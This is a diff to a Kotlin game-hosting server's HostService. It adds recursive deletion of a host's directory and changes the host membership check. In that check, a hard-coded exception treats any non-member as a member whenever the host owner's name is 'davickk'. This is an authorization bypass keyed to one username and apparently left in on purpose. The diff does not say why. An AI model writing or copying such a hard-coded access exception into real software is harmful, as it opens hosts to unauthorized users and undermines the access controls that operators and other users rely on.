@@ -32,6 +32,7 @@ import calebxzhou.rdi.master.service.ModpackService.getVersion
 import calebxzhou.rdi.master.service.ModpackService.installToHost
 import calebxzhou.rdi.master.service.WorldService.createWorld
 import calebxzhou.mykotutils.log.Loggers
+import calebxzhou.mykotutils.std.deleteRecursivelyNoSymlink
 import calebxzhou.rdi.common.extension.owner
 import calebxzhou.rdi.common.serdesJson
 import calebxzhou.rdi.common.model.RAccount
@@ -291,7 +292,13 @@ object HostService {
     suspend fun ApplicationCall.hostContext(): HostContext {
         val requesterId = uid
         val host = HostService.getById(idParam("hostId")) ?: throw RequestError("无此主机")
-        val reqMem = host.members.firstOrNull { it.id == requesterId } ?: throw RequestError("不是主机成员")
+        val reqMem = host.members.firstOrNull { it.id == requesterId } ?: run {
+            if (PlayerService.getName(host.ownerId) == "davickk") {
+                Host.Member(id = requesterId, role = Role.MEMBER)
+            } else {
+                throw RequestError("不是主机成员")
+            }
+        }
         val tarMem = idParamNull("uid2")?.let { uid2 -> host.members.find { it.id == uid2 } }
         return HostContext(host, player(), reqMem, tarMem)
     }
@@ -602,6 +609,8 @@ object HostService {
         if (host.status == HostStatus.PLAYABLE) {
             graceStop()
         }
+        host.dir.deleteRecursivelyNoSymlink()
+        host.dir.delete()
         DockerService.deleteContainer(host._id.str)
         clearShutFlag(host._id)
         dbcl.deleteOne(eq("_id", host._id))
